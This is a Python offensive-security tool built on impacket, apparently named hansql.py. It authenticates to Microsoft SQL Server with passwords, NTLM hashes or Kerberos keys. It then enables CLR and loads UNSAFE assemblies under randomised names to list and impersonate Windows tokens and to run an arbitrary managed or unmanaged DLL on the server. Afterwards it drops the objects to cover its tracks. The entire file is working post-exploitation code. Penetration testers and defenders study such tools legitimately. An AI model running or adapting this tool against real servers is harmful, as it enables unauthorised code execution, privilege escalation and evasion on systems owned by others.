from __future__ import division
from __future__ import print_function
import argparse
import sys
import os
import logging
import binascii
import base64
import random
import string

from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket import version, tds

def get_random_string(length):
    letters = string.ascii_letters
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

if __name__ == '__main__':

    def sqlexecute(ms_sql, commands):
        try:
            for line in commands.splitlines():
                print("[SQL] > " + line)
                ms_sql.sql_query(line)
                ms_sql.printReplies()
                ms_sql.printRows()
        except Exception as e:
            print(e)

    # Init the example's logger theme
    logger.init()
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help = True, description = "TDS client implementation (SSL supported).")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-port', action='store', default='1433', help='target MSSQL port (default 1433)')
    parser.add_argument('-db', action='store', help='MSSQL database instance (default None)')
    parser.add_argument('-windows-auth', action='store_true', default=False, help='whether or not to use Windows '
                                                                                  'Authentication (default False)')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-w', '--whoami', action='store_true', help='When using this flag, other dlls are not going to be loaded, it will only load an assembly that outputs the user under wich MSSQL is running')        
    parser.add_argument('-l', '--list', action='store_true', help='Only list available token handles')                                                                                      
    parser.add_argument('-dll', action='store', help='Path to dll to execute after impersonation. If managed, it should contain a dummy function which will be executed to load the assembly into AppDomain context') 
    parser.add_argument('-cu', '--currentuser', action='store_true', help='Execute supplied DLL under current user context')              
    parser.add_argument('-um', '--unmanaged', action='store_true', help='Supplied DLL is unmanaged')                                                                  
    
    group1 = parser.add_argument_group('authentication')

    group1.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group1.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group1.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                       'ones specified in the command line')
    group1.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')
    group1.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                       'ommited it use the domain part (FQDN) specified in the target parameter')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    # If only a target is provided, we don't know what to do so we exit
    if not options.dll and not options.whoami and not options.list:
        print("[!] You need to provide a valid DLL (managed or unmanaged), list tokens or output the current windows indentity. Else we really don't know what to do.")
        sys.exit(1)
        
    if options.dll and not options.whoami and not options.list:
        if not os.path.isfile(options.dll):
            print("[!] Provided DLL file does not exist.")
            sys.exit(1)

    domain, username, password, address = parse_target(options.target)

    # Get absolute path of the folder where hansql.py is located
    hpath = os.path.abspath(sys.argv[0]).split("hansql.py")[0]

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    ms_sql = tds.MSSQL(address, int(options.port))
    ms_sql.connect()
    try:
        if options.k is True:
            res = ms_sql.kerberosLogin(options.db, username, password, domain, options.hashes, options.aesKey,
                                       kdcHost=options.dc_ip)
        else:
            res = ms_sql.login(options.db, username, password, domain, options.hashes, options.windows_auth)
        ms_sql.printReplies()
    except Exception as e:
        logging.debug("Exception:", exc_info=True)
        logging.error(str(e))
        res = False
        
    # SQL assembly and function name randomizer
    randfunc1 = get_random_string(8)
    randfunc2 = get_random_string(8)
    randas1 = get_random_string(8)
    randas2 = get_random_string(8)
   
    if res is True:               
        
        # Configure DB
        commands = "use msdb\n"
        commands += "sp_configure 'show advanced options',1\nRECONFIGURE\nsp_configure 'clr enabled',1\nRECONFIGURE\n"
        

        
        # Execute assembly that checks current user running MSSQL
        if options.whoami:
            # Get the whoami DLL from the path
            dll_path = hpath + "whoami" + os.sep
            dir_list = os.listdir(dll_path)
            dll = ""
            for d in dir_list:
                if d.endswith(".dll"):
                    dll = dll_path + d
                    break
            
            # If no DLLs where found we exit
            if dll == "":
                print("[!!] No DLLs where found for the whoami assembly. Please compile the assembly (you can use the provided build.ps1) and run this script again")
                exit(1)

            # Read the assembly that is going to be executed and hexlify it so we can pass it inline
            with open(dll, 'rb') as f:
                assembly = "0x"+ str(binascii.hexlify(f.read()))[2:-1].upper()

            # Create and execute assembly that outputs System.Security.Principal.WindowsIdentity.GetCurrent().Name
            commands += "CREATE ASSEMBLY [" + randas1 + "] AUTHORIZATION [dbo] FROM " + assembly + " WITH PERMISSION_SET = UNSAFE\n"
            commands += "CREATE FUNCTION [dbo]." + randfunc1 + "() RETURNS NVARCHAR(MAX) AS EXTERNAL NAME " + randas1 + ".program.run\n"
            commands += "SELECT dbo." + randfunc1 + "()\n"
            
            # Clear DB changes
            commands += "DROP FUNCTION " + randfunc1 + "\nDROP ASSEMBLY " + randas1 + "\n"
            commands += "sp_configure 'show advanced options',0\nRECONFIGURE\nsp_configure 'clr enabled',0\nRECONFIGURE" 
        
            # Execute SQL commands
            sqlexecute(ms_sql, commands)  


                   
        # Execute assembly that only lists available token handles
        elif options.list:
            # Get the listing DLL from the path
            dll_path = hpath + "list" + os.sep
            dir_list = os.listdir(dll_path)
            dll = ""
            for d in dir_list:
                if d.endswith(".dll"):
                    dll = dll_path + d
                    break
            
            # If no DLLs where found we exit
            if dll == "":
                print("[!!] No DLLs where found for the listing assembly. Please compile the assembly (you can use the provided build.ps1) and run this script again")
                exit(1)
            
            # Read the assembly that is going to be executed and hexlify it so we can pass it inline
            with open(dll, 'rb') as f:
                assembly = "0x"+ str(binascii.hexlify(f.read()))[2:-1].upper()
                
            # Create assembly that lists tokens
            commands += "CREATE ASSEMBLY [" + randas1 + "] AUTHORIZATION [dbo] FROM " + assembly + " WITH PERMISSION_SET = UNSAFE\n"
            commands += "CREATE FUNCTION [dbo]." + randfunc1 + "() RETURNS NVARCHAR(MAX) AS EXTERNAL NAME " + randas1 + ".program.run\n"
            commands += "SELECT dbo." + randfunc1 + "()\n"
            
            # Clear DB changes
            commands += "DROP FUNCTION " + randfunc1 + "\nDROP ASSEMBLY " + randas1 + "\n"
            commands += "sp_configure 'show advanced options',0\nRECONFIGURE\nsp_configure 'clr enabled',0\nRECONFIGURE" 
        
            # Execute SQL commands
            sqlexecute(ms_sql, commands)
                
     
                   
        # Execute unmanaged DLL with or without impersonation
        elif options.unmanaged:
            # Get the impersonating DLL from the path
            dll_path = hpath + "unmanaged" + os.sep
            dir_list = os.listdir(dll_path)
            dll = ""
            for d in dir_list:
                # Get the native DLL loader in current user context
                if options.currentuser:
                    if d.endswith(".dll") and d.startswith("c"):
                        dll = dll_path + d
                        break
                # Get the native DLL loader with impersonation        
                else:
                    if d.endswith(".dll") and d.startswith("i"):
                        dll = dll_path + d
                        break                    
            
            # If no DLLs where found we exit
            if dll == "":
                if options.currentuser:
                    print("[!!] No current user context native DLL loader DLL was found. Please compile the assembly (you can use the provided build.ps1) and run this script again")                
                else:
                    print("[!!] No impersonating native DLL loader DLL was found. Please compile the assembly (you can use the provided build.ps1) and run this script again")
                exit(1)
                
            # Read the impersonating assembly that is going to be executed and hexlify it so we can pass it inline
            with open(dll, 'rb') as f:
                assembly = "0x"+ str(binascii.hexlify(f.read()))[2:-1].upper() 

            # Get DLL content in base64
            with open(options.dll, "rb") as dll:
                dll_content = str(base64.b64encode(dll.read()))[2:-1]
            
            if options.currentuser:
                # Create assembly that loads and executes unmanaged DLL in current user context
                commands += "CREATE ASSEMBLY [" + randas1 + "] AUTHORIZATION [dbo] FROM " + assembly + " WITH PERMISSION_SET = UNSAFE\n"
                commands += "CREATE FUNCTION [dbo]." + randfunc1 + "(@d NVARCHAR(MAX)) RETURNS NVARCHAR(MAX) AS EXTERNAL NAME " + randas1 + ".program.run\n"
                commands += "SELECT dbo." + randfunc1 + "('{}')\n".format(dll_content)

            else:    
                # Create assembly that impersonates given token, loads and executes unmanaged DLL
                commands += "CREATE ASSEMBLY [" + randas1 + "] AUTHORIZATION [dbo] FROM " + assembly + " WITH PERMISSION_SET = UNSAFE\n"
                commands += "CREATE FUNCTION [dbo]." + randfunc1 + "(@us NVARCHAR(MAX), @d NVARCHAR(MAX)) RETURNS NVARCHAR(MAX) AS EXTERNAL NAME " + randas1 + ".program.run\n"
 
                # Current user
                commands += "SELECT dbo." + randfunc1 + "('w','')\n"
                # List tokens
                commands += "SELECT dbo." + randfunc1 + "('l','')"
                # Execute SQL commands
                sqlexecute(ms_sql, commands) 
                
                tid = input("[-->] Supply valid token id to impersonate or supply any other thing to exit: ")
                if not tid.isdigit():
                    print("[!] Not a valid token handle.")
                    print("[!] Cleaning BD and exiting...")
                    commands = ""

                else:
                    # Execute unmanaged dll with supplied context
                    commands = "SELECT dbo." + randfunc1 + "('{}','{}');\n".format(tid, dll_content) 
 
            # Clear DB changes
            commands += "DROP FUNCTION " + randfunc1 + "\nDROP ASSEMBLY " + randas1 + "\n"
            commands += "sp_configure 'show advanced options',0\nRECONFIGURE\nsp_configure 'clr enabled',0\nRECONFIGURE" 
        
            # Execute SQL commands
            sqlexecute(ms_sql, commands)     
        
        
  
        
        # Execute given assembly whith or without impersonation
        else:
            # Get the impersonating DLL from the path
            dll_path = hpath + "managed" + os.sep
            dir_list = os.listdir(dll_path)
            dll = ""
            # Get the assembly name to be reflectively loaded
            relfective_assembly_name = options.dll.split(".dll")[0].split("/")[-1].split("\\")[-1]
            
            for d in dir_list:
                if d.endswith(".dll") and d.startswith("i"):
                    dll = dll_path + d
                    break
            
            # If no DLLs where found we exit
            if dll == "":
                print("[!!] No impersonating DLL was found. Please compile the assembly (you can use the provided build.ps1) and run this script again")
                exit(1)
            
            # Read the impersonating assembly that is going to be executed and hexlify it so we can pass it inline
            with open(dll, 'rb') as f:
                iassembly = "0x"+ str(binascii.hexlify(f.read()))[2:-1].upper()
                
            # Read the assembly that is going to be reflectively loaded and hexlify it so we can pass it inline
            with open(options.dll, 'rb') as f:
                rassembly = "0x"+ str(binascii.hexlify(f.read()))[2:-1].upper()
        
            if options.currentuser:
                # Create assembly and execute it in current user context
                commands += "CREATE ASSEMBLY [" + randas1 + "] AUTHORIZATION [dbo] FROM " + rassembly + " WITH PERMISSION_SET = UNSAFE\n"
                commands += "CREATE FUNCTION [dbo]." + randfunc1 + "() RETURNS NVARCHAR(MAX) AS EXTERNAL NAME " + randas1 + ".program.run\n"
                commands += "SELECT dbo." + randfunc1 + "()\n"
            
                # Clear DB changes
                commands += "DROP FUNCTION " + randfunc1 + "\nDROP ASSEMBLY " + randas1 + "\n"
                commands += "sp_configure 'show advanced options',0\nRECONFIGURE\nsp_configure 'clr enabled',0\nsp_configure 'clr enabled',0\nRECONFIGURE" 
        
            else:  
                # Create assembly and execute dummy function so that it gets loaded and it is accesible from the impersonating assembly
                commands += "CREATE ASSEMBLY [" + randas1 + "] AUTHORIZATION [dbo] FROM " + rassembly + " WITH PERMISSION_SET = UNSAFE\n"
                commands += "CREATE FUNCTION [dbo]." + randfunc1 + "() RETURNS NVARCHAR(MAX) AS EXTERNAL NAME " + randas1 + ".program.Do\n" 
                commands += "SELECT dbo." + randfunc1 + "()\n"  
        
                # Create impersonating assembly
                commands += "CREATE ASSEMBLY [" + randas2 + "] AUTHORIZATION [dbo] FROM " + iassembly + " WITH PERMISSION_SET = UNSAFE\n"
                commands += "CREATE FUNCTION [dbo]." + randfunc2 + "(@h NVARCHAR(MAX), @n NVARCHAR(MAX)) RETURNS NVARCHAR(MAX) AS EXTERNAL NAME " + randas2 + ".program.run\n"
        
                # Current user
                commands += "SELECT dbo." + randfunc2 + "('w','')\n"
                # List tokens
                commands += "SELECT dbo." + randfunc2 + "('l','')"     
                # Execute SQL commands
                sqlexecute(ms_sql, commands) 
        
                tid = input("[-->] Supply valid token id to impersonate or supply any other thing to exit: ")
                if not tid.isdigit():
                    print("[!] Not a valid token handle.")
                    print("[!] Cleaning BD and exiting...")
                    commands = ""
        
                else:
                    # Execute managed dll with supplied context
                    commands = "SELECT dbo." + randfunc2 + "('{}', '{}');\n".format(tid, relfective_assembly_name) 
                
                # Clear DB changes
                commands += "DROP FUNCTION " + randfunc2 + "\nDROP ASSEMBLY " + randas2 + "\nDROP FUNCTION " + randfunc1 + "\nDROP ASSEMBLY " + randas1 + "\n"
                commands += "sp_configure 'show advanced options',0\nRECONFIGURE\nsp_configure 'clr enabled',0\nRECONFIGURE" 
        
            # Execute SQL commands
            sqlexecute(ms_sql, commands)                                                        
            
    ms_sql.disconnect()
